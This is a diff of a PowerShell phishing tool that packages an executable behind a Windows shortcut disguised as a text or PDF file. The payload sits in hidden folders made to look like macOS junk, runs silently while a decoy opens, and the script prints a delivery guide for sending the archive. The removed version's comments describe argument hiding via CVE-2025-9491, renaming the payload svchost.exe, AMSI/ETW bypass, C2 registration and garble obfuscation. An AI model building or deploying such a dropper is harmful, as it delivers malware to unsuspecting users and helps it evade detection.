@@ -1,19 +1,15 @@
-# Fish LNK Phishing Script v2 (Evasion Hardened)
-# Improvements:
-#   1. CVE-2025-9491: LNK args hidden after 260-char padding
-#   2. No cmd.exe/bat middle layer: LNK -> payload directly
-#   3. Harmless dir name (.assets, NOT __MACOSX which is known IOC)
-#   4. Payload renamed to svchost.exe
-# Usage: .\phish.ps1 -ExePath .\fish.exe -DecoyName "report.pdf" -IconType "pdf"
+# Fish LNK Phishing Script v3
+# Based on APT tactics: LNK -> hidden folder -> run.bat (start payload + open decoy)
+# Hidden folder mimics macOS __MACOSX junk, users won't notice it
+# Usage: .\phish.ps1 -ExePath .\fish.exe -DecoyName "CTF_challenge.txt" -IconType "txt"
 
 param(
     [Parameter(Mandatory=$true)]
     [string]$ExePath,
-    [string]$DecoyName = "report.pdf",
+    [string]$DecoyName = "CTF_challenge.txt",
     [string]$DecoyContent = "",
-    [string]$IconType = "pdf",
-    [string]$OutputName = "report",
-    [string]$ResDir = ".assets",
+    [string]$IconType = "txt",
+    [string]$OutputName = "challenge",
     [switch]$KeepWorking = $false
 )
 
@@ -24,56 +20,66 @@ if (-not (Test-Path $ExePath)) {
     exit 1
 }
 
+$exeName = Split-Path $ExePath -Leaf
 $workDir = Join-Path $env:TEMP "fish_lnk_$(Get-Random)"
+$hiddenDir = "__MACOSX"
+$subDir = ".note"
 
-Write-Host "[+] Fish LNK Phishing Tool v2 (Evasion Hardened)" -ForegroundColor Cyan
+Write-Host "[+] Fish LNK Phishing Tool v3" -ForegroundColor Cyan
 Write-Host "[+] Work dir: $workDir"
 
-# Step 1: Create dirs + copy files
+# Step 1: Create hidden directory structure
 Write-Host "[+] Creating directory structure..."
 
-$resPath = Join-Path $workDir $ResDir
-New-Item -ItemType Directory -Path $resPath -Force | Out-Null
+$hiddenPath = Join-Path $workDir $hiddenDir
+$subPath = Join-Path $hiddenPath $subDir
+New-Item -ItemType Directory -Path $subPath -Force | Out-Null
 
-$payloadName = "svchost.exe"
-Copy-Item $ExePath (Join-Path $resPath $payloadName)
+# Copy payload
+Copy-Item $ExePath (Join-Path $subPath $exeName)
 
-$decoyPath = Join-Path $resPath $DecoyName
+# Create decoy file
+$decoyPath = Join-Path $subPath $DecoyName
 if ($DecoyContent -ne "") {
     Set-Content -Path $decoyPath -Value $DecoyContent -Encoding UTF8
 } else {
-    $defaultDecoy = "Fish C2 Decoy Document - Replace with real PDF"
+    $defaultDecoy = @"
+谜题：请解密以下内容获得flag
+ZmxhZ3t0aGlzX2lzX2FfZmFrZV9mbGFnfQ==
+提示：Base64编码
+"@
     Set-Content -Path $decoyPath -Value $defaultDecoy -Encoding UTF8
 }
 
-Write-Host "[+] Directory structure:" -ForegroundColor Green
-Write-Host "  $OutputName.lnk  (icon: $IconType)"
-Write-Host "  $ResDir\"
-Write-Host "    |-- $DecoyName (decoy)"
-Write-Host "    |-- $payloadName (payload)"
+# Step 2: Generate run.bat
+Write-Host "[+] Generating run.bat..."
 
-# Step 2: Generate LNK (CVE-2025-9491 hardened)
-Write-Host "[+] Generating LNK shortcut (CVE-2025-9491 arg hiding)..."
+$batContent = @"
+@echo off
+start /b "" "$hiddenDir\$subDir\$exeName"
+start notepad "$hiddenDir\$subDir\$DecoyName"
+"@
+
+$batPath = Join-Path $subPath "run.bat"
+Set-Content -Path $batPath -Value $batContent -Encoding ASCII
+
+# Step 3: Generate LNK
+Write-Host "[+] Generating LNK shortcut..."
 
 $lnkPath = Join-Path $workDir "$OutputName.lnk"
 
 $shell = New-Object -ComObject WScript.Shell
 $shortcut = $shell.CreateShortcut($lnkPath)
 
-# Key: LNK targets payload directly (no cmd.exe/bat layer)
-# Payload has built-in: AMSI bypass -> ETW bypass -> drop PDF -> C2 register
-$shortcut.TargetPath = Join-Path $ResDir $payloadName
-
-# CVE-2025-9491: 260-char whitespace padding hides args from Properties dialog
-$padding = " " * 260
-$shortcut.Arguments = $padding
-
+# LNK -> cmd.exe -> run.bat (bat handles both payload + decoy)
+$shortcut.TargetPath = "cmd.exe"
+$shortcut.Arguments = "/c start /b """" ""$hiddenDir\$subDir\run.bat"""
 $shortcut.WindowStyle = 7  # SW_SHOWMINNOACTIVE
 
-# Icon map (harmless system icons)
+# Set icon
 $iconMap = @{
-    "pdf"    = "$env:SystemRoot\System32\shell32.dll,68"
     "txt"    = "$env:SystemRoot\System32\shell32.dll,70"
+    "pdf"    = "$env:SystemRoot\System32\shell32.dll,68"
     "doc"    = "$env:SystemRoot\System32\shell32.dll,42"
     "xls"    = "$env:SystemRoot\System32\shell32.dll,120"
     "folder" = "$env:SystemRoot\System32\shell32.dll,3"
@@ -82,30 +88,29 @@ $iconMap = @{
 if ($iconMap.ContainsKey($IconType)) {
     $shortcut.IconLocation = $iconMap[$IconType]
 } else {
-    $shortcut.IconLocation = $iconMap["pdf"]
+    $shortcut.IconLocation = $iconMap["txt"]
 }
 
 $shortcut.Description = $DecoyName
 $shortcut.Save()
 
 Write-Host "[+] LNK generated: $lnkPath" -ForegroundColor Green
-Write-Host "    Target: $ResDir\$payloadName (direct, no cmd.exe layer)"
-Write-Host "    Args: 260-char padding (CVE-2025-9491)"
+Write-Host "    Target: cmd.exe /c start /b $hiddenDir\$subDir\run.bat"
 Write-Host "    Icon: $IconType"
 
-# Step 3: Set hidden attributes
+# Step 4: Set hidden attributes on __MACOSX
 Write-Host "[+] Setting hidden attributes..."
 
-$resItem = Get-Item $resPath -Force
-$resItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Directory
+$hiddenItem = Get-Item $hiddenPath -Force
+$hiddenItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Directory
 
-Get-ChildItem $resPath -Recurse -Force | ForEach-Object {
+Get-ChildItem $hiddenPath -Recurse -Force | ForEach-Object {
     $_.Attributes = $_.Attributes -bor [System.IO.FileAttributes]::Hidden
 }
 
-Write-Host "[+] Hidden attributes set" -ForegroundColor Green
+Write-Host "[+] Hidden attributes set on $hiddenDir" -ForegroundColor Green
 
-# Step 4: 7-Zip packaging
+# Step 5: Package with 7-Zip (required to preserve hidden attrs)
 Write-Host "[+] Packaging..."
 
 $output7z = Join-Path (Get-Location) "$OutputName.7z"
@@ -127,38 +132,44 @@ if ($sevenZip) {
     & $sevenZip a -r $output7z "." | Out-Null
     Pop-Location
     Write-Host "[+] 7z archive: $output7z" -ForegroundColor Green
+    Write-Host "    (Uses 7z to preserve hidden folder attrs)" -ForegroundColor Yellow
 } else {
     Compress-Archive -Path "$workDir\*" -DestinationPath $outputZip -Force
-    Write-Host "[+] ZIP archive: $outputZip (warning: may lose hidden attrs)" -ForegroundColor Yellow
+    Write-Host "[+] ZIP archive: $outputZip" -ForegroundColor Yellow
+    Write-Host "[!] WARNING: ZIP may lose hidden attrs. Install 7-Zip!" -ForegroundColor Red
 }
 
-# Step 5: Cleanup
+# Step 6: Cleanup
 if (-not $KeepWorking) {
-    Get-ChildItem $resPath -Recurse -Force | ForEach-Object {
+    # Remove hidden attrs first so we can delete
+    Get-ChildItem $hiddenPath -Recurse -Force | ForEach-Object {
         $_.Attributes = [System.IO.FileAttributes]::Normal
     }
-    $resItem.Attributes = [System.IO.FileAttributes]::Normal
+    $hiddenItem.Attributes = [System.IO.FileAttributes]::Normal
     Remove-Item $workDir -Recurse -Force
     Write-Host "[+] Work dir cleaned" -ForegroundColor Green
 } else {
     Write-Host "[*] Work dir kept: $workDir" -ForegroundColor Yellow
 }
 
-# Delivery guide
+# Guide
 Write-Host ""
 Write-Host "========== Delivery Guide ==========" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "Chain: LNK -> payload.exe (AMSI/ETW bypass -> drop PDF -> C2)"
+Write-Host "Chain: LNK -> cmd.exe -> run.bat -> payload.exe + notepad decoy"
 Write-Host ""
-Write-Host "Evasion:"
-Write-Host "  - No cmd.exe/bat middle layer"
-Write-Host "  - CVE-2025-9491 arg hiding (260-char padding)"
-Write-Host "  - Payload renamed svchost.exe"
-Write-Host "  - Dir name .assets (NOT __MACOSX)"
-Write-Host "  - AMSI + ETW bypass built into payload"
+$deliverFile = if ($sevenZip) { $output7z } else { $outputZip }
+Write-Host "File to send: $deliverFile"
 Write-Host ""
-Write-Host "Notes:"
-Write-Host "  - Payload must have //go:embed decoy.pdf"
-Write-Host "  - Build with: garble -tiny -literals -controlflow"
-Write-Host "  - 7z preserves hidden attrs, ZIP may not"
+Write-Host "User sees after extract:"
+Write-Host "  $OutputName.lnk  (icon: $IconType)"
+Write-Host ""
+Write-Host "Hidden (user cannot see):"
+Write-Host "  $hiddenDir\$subDir\run.bat"
+Write-Host "  $hiddenDir\$subDir\$exeName"
+Write-Host "  $hiddenDir\$subDir\$DecoyName"
+Write-Host ""
+Write-Host "User clicks LNK -> decoy opens in notepad -> payload runs silently"
+Write-Host ""
+Write-Host "IMPORTANT: Package with 7-Zip to preserve hidden attrs!"
 Write-Host "======================================" -ForegroundColor Cyan
